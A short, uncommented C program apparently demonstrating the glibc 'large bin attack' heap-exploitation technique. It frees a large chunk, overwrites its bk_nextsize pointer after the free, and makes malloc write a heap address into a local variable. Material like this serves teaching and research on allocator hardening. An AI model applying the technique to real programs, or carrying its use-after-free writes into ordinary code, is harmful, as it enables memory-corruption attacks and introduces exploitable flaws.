#include<stdlib.h>
#include<stdio.h>
#include<assert.h>
int main(){
  size_t target = 0;
  size_t *p1 = malloc(0x428);
  size_t *g1 = malloc(0x18);
  size_t *p2 = malloc(0x418);
  size_t *g2 = malloc(0x18);
  free(p1);
  size_t *g3 = malloc(0x438);
  free(p2);
  p1[3] = (size_t)((&target)-4);
  size_t *g4 = malloc(0x438);
  assert((size_t)(p2-2) == target);
  return 0;
}

